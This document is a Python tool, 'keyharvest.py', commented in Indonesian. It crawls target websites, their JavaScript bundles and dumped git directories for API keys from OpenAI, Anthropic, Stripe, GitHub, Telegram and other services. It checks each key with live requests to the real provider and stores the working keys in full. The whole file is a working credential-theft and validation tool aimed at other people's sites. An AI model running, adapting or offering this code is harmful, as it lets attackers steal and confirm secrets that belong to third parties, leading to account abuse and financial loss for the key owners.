#!/usr/bin/env python3
"""
keyharvest.py — cari API key + base URL dari target apa pun, lalu VALIDASI ke endpoint aslinya.

Sumber:
  - URL (HTML/JS bundle/sourcemap)
  - file lokal / direktori (mis. hasil git-dumper)
  - stdin (pipe hasil grep)

Output:
  <out>/keys.jsonl   -> key lengkap (chmod 600), provider, base_url, status validasi
  stdout             -> ringkasan dengan key di-mask

Contoh:
  python3 keyharvest.py -u https://target.tld
  python3 keyharvest.py -d dumped/.git
  grep -rhoE 'sk-[A-Za-z0-9_-]{20,}' . | python3 keyharvest.py
"""
import argparse
import hashlib
import json
import os
import re
import sys
import time
import uuid

import requests

TIMEOUT = 8
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.10 Safari/537.36"

# provider -> (regex, base_url, cara validasi)
P = [
    ("openai", re.compile(r"sk-(?:proj-)?[A-Za-z0-9_-]{20,}"), "https://api.openai.com/v1"),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), "https://api.anthropic.com/v1"),
    ("openrouter", re.compile(r"sk-or-v1-[a-f0-9]{32,}"), "https://openrouter.ai/api/v1"),
    ("groq", re.compile(r"gsk_[A-Za-z0-9]{40,}"), "https://api.groq.com/openai/v1"),
    ("deepai_tryit", re.compile(r"tryit-\d+-[a-f0-9]{32}"), "https://api.deepai.org"),
    ("deepai_userkey", re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"), "https://api.deepai.org"),
    ("google_api", re.compile(r"AIza[0-9A-Za-z_-]{35}"), "https://generativelanguage.googleapis.com/v1beta"),
    ("stripe", re.compile(r"(?:sk|rk)_(?:live|test)_[0-9a-zA-Z]{16,}"), "https://api.stripe.com/v1"),
    ("github", re.compile(r"gh[pousr]_[A-Za-z0-9]{36,}"), "https://api.github.com"),
    ("huggingface", re.compile(r"hf_[A-Za-z0-9]{30,}"), "https://huggingface.co/api"),
    ("telegram", re.compile(r"\d{8,10}:AA[0-9A-Za-z_-]{33}"), "https://api.telegram.org"),
    ("replicate", re.compile(r"r8_[A-Za-z0-9]{30,}"), "https://api.replicate.com/v1"),
    ("cohere", re.compile(r"[A-Za-z0-9]{40}"), None),  # terlalu umum, validasi dilewati
]
BASE_RE = re.compile(r"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]{6,120}")


def mask(k):
    return k[:6] + "…" + k[-4:] if len(k) > 14 else k[:3] + "…"


def validate(provider, key):
    """Return (ok_str, detail) — bukti nyata dari endpoint asli."""
    h = {"User-Agent": UA}
    try:
        if provider in ("openai", "groq", "openrouter"):
            url = {"openai": "https://api.openai.com/v1/models",
                   "groq": "https://api.groq.com/openai/v1/models",
                   "openrouter": "https://openrouter.ai/api/v1/auth/key"}[provider]
            r = requests.get(url, headers={**h, "Authorization": f"Bearer {key}"}, timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "anthropic":
            r = requests.post("https://api.anthropic.com/v1/messages",
                              headers={**h, "x-api-key": key, "anthropic-version": "2023-06-01",
                                       "Content-Type": "application/json"},
                              json={"model": "claude-3-5-haiku-20241022", "max_tokens": 1,
                                    "messages": [{"role": "user", "content": "hi"}]}, timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "google_api":
            r = requests.get(f"https://generativelanguage.googleapis.com/v1beta/models?key={key}", timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "stripe":
            r = requests.get("https://api.stripe.com/v1/charges?limit=1",
                             headers={**h, "Authorization": f"Bearer {key}"}, timeout=TIMEOUT)
            return ("VALID" if r.status_code in (200, 403) and "api_key" not in r.text[:80] else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "github":
            r = requests.get("https://api.github.com/user", headers={**h, "Authorization": f"token {key}"}, timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "huggingface":
            r = requests.get("https://huggingface.co/api/whoami-v2",
                             headers={**h, "Authorization": f"Bearer {key}"}, timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "telegram":
            r = requests.get(f"https://api.telegram.org/bot{key}/getMe", timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 and r.json().get("ok") else f"HTTP {r.status_code}"), r.text[:120]
        if provider == "replicate":
            r = requests.get("https://api.replicate.com/v1/account",
                             headers={**h, "Authorization": f"Bearer {key}"}, timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
        if provider.startswith("deepai"):
            r = requests.post("https://api.deepai.org/hacking_is_a_serious_crime",
                              headers={**h, "api-key": key, "Origin": "https://deepai.org"},
                              files={"chatHistory": (None, '[{"role":"user","content":"ok"}]'),
                                     "chat_style": (None, "claudeai_0"), "model": (None, "standard"),
                                     "session_uuid": (None, str(uuid.uuid4())), "sensitivity_request_id": (None, str(uuid.uuid4())),
                                     "hacker_is_stinky": (None, "very_stinky"), "enabled_tools": (None, "[]")},
                              timeout=TIMEOUT)
            return ("VALID" if r.status_code == 200 else f"HTTP {r.status_code}"), r.text[:120]
    except Exception as e:
        return "ERROR", str(e)[:120]
    return "SKIP", "tanpa validator"


def harvest_text(text, src):
    out = []
    for prov, rx, base in P:
        for m in rx.finditer(text):
            k = m.group(0)
            if prov == "cohere" and not k.startswith(("co-", "co_")) and "co" not in k[:3]:
                continue
            out.append({"provider": prov, "key": k, "base_url": base, "source": src,
                        "context": text[max(0, m.start() - 60):m.end() + 20].replace("\n", " ")[:160]})
    for m in BASE_RE.finditer(text):
        out.append({"provider": "base_url", "key": m.group(0), "base_url": m.group(0), "source": src})
    return out


def fetch(url):
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=TIMEOUT)
        return r.text
    except Exception:
        return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", action="append", default=[], help="URL target (boleh berulang)")
    ap.add_argument("-d", "--dir", action="append", default=[], help="direktori lokal untuk disisir")
    ap.add_argument("-f", "--file", action="append", default=[], help="file lokal")
    ap.add_argument("-o", "--out", default="keys_out")
    ap.add_argument("--no-validate", action="store_true")
    a = ap.parse_args()

    os.makedirs(a.out, exist_ok=True)
    text_sources = []
    for u in a.url:
        body = fetch(u)
        text_sources.append((body, u))
        for ju in list(dict.fromkeys(re.findall(r'["\']([^"\']+\.js[^"\']*)["\']', body)))[:10]:
            if ju.startswith(("http", "/")):
                full = ju if ju.startswith("http") else u.rstrip("/") + "/" + ju.lstrip("/")
                text_sources.append((fetch(full), full))
    for d in a.dir:
        for root, _, files in os.walk(d):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    if os.path.getsize(p) > 4_000_000:
                        continue
                    text_sources.append((open(p, errors="replace").read(), p))
                except Exception:
                    pass
    for f in a.file:
        text_sources.append((open(f, errors="replace").read(), f))
    if not text_sources and not sys.stdin.isatty():
        text_sources.append((sys.stdin.read(), "<stdin>"))
    if not text_sources:
        ap.error("butuh -u/-d/-f atau stdin")

    found, seen = [], set()
    for text, src in text_sources:
        for c in harvest_text(text, src):
            fp = hashlib.sha256(c["key"].encode()).hexdigest()[:16]
            if fp in seen:
                continue
            seen.add(fp)
            if c["provider"] != "base_url" and not a.no_validate:
                st, detail = validate(c["provider"], c["key"])
                c["status"], c["detail"] = st, detail
            found.append(c)

    jl = open(f"{a.out}/keys.jsonl", "w")
    for c in found:
        jl.write(json.dumps(c) + "\n")
    jl.close()
    os.chmod(f"{a.out}/keys.jsonl", 0o600)

    keys = [c for c in found if c["provider"] != "base_url"]
    bases = sorted({c["key"] for c in found if c["provider"] == "base_url"})[:15]
    valid = [c for c in keys if c.get("status") == "VALID"]
    print(f"kandidat key: {len(keys)} | VALID: {len(valid)} | base_url unik: {len(bases)}")
    for c in keys:
        print(f"  {c['provider']:<18} {mask(c['key'])}  {c.get('status','?')}  {c['base_url']}  <- {c['source'][:60]}")
    for b in bases[:10]:
        print(f"  base  {b}")
    print(f"-> {a.out}/keys.jsonl (mode 600)")


if __name__ == "__main__":
    main()
